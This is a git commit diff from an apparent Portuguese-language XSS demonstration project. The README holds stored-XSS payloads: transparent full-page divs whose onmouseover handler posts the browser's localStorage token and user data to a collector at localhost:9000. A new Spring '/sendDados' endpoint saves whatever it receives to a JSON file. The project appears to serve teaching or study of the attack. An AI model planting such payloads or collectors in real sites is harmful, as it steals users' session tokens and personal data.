a5a64cab45cc96e309105d78da7aab96aa8c1c59
edsonrdl <91911044+edsonrdl@users.noreply.github.com>
2023-10-23 20:17:43 -0300

    feat:Atualizado

--- README.md
+++ README.md
@@ -12,7 +12,7 @@
 `<div onmouseover="axios.post('http://localhost:9000/sendToken', {}, {headers:{Authorization:localStorage['token']} }).then((result)=>{})" style="width:100vw; height: 100vh; color:transparent"></div>`
 
 
-`<div onmouseover="axios.post('http://localhost:9000/sendDados', {}, {headers: 'Content-Type': 'application/json',},body: JSON.stringify(users),}).then((result)=>{})" style="width:100vw; height: 100vh; color:transparent"></div>`
+`<div onmouseover="axios.post('http://localhost:9000/sendDados', {}, {headers: 'Content-Type': 'application/json',},body:JSON.stringify(user),}).then((result)=>{});"style="width:100vw; height: 100vh; color:transparent"></div>`
 
 
 
--- src/main/java/com/ataque/xss/xss/controller/DadosController.java
+++ src/main/java/com/ataque/xss/xss/controller/DadosController.java
@@ -1,11 +1,18 @@
 package com.ataque.xss.xss.controller;
 
+import java.io.File;
+import java.io.IOException;
+
+import org.springframework.http.HttpStatus;
+import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
  import org.springframework.web.bind.annotation.RequestHeader;
 import org.springframework.web.bind.annotation.RequestMapping;
 
 import org.springframework.web.bind.annotation.RestController;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
 
 
 
@@ -20,10 +27,26 @@ public class DadosController {
             System.out.println("---------");
         }  
 
-    //    @PostMapping("/sendDados")
-    //     public void handleRequest(@RequestHeader("Authorization") String token, @RequestBody String body) {
-    //         System.out.println("Token: " + token);
-    //         System.out.println("Corpo: " + body);
-    //         System.out.println("---------");
-    //     }  
-}
+    @PostMapping("/sendDados")
+    public ResponseEntity<Void> receiveAndSaveData(@RequestBody Object data) {
+        try {
+            // Converter o objeto recebido em uma representação JSON
+            ObjectMapper objectMapper = new ObjectMapper();
+            String jsonData = objectMapper.writeValueAsString(data);
+
+            // Caminho para o arquivo onde você deseja salvar os dados
+            String filePath = "././arquivo.json";
+
+            // Salvar os dados no arquivo JSON
+            objectMapper.writeValue(new File(filePath), jsonData);
+
+            System.out.println("Dados recebidos e salvos com sucesso no arquivo JSON.");
+            
+            // Você pode retornar uma resposta de sucesso (HttpStatus.OK) se necessário
+            return ResponseEntity.ok().build();
+        } catch (IOException e) {
+            e.printStackTrace();
+            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).build();
+        }
+    }
+       }
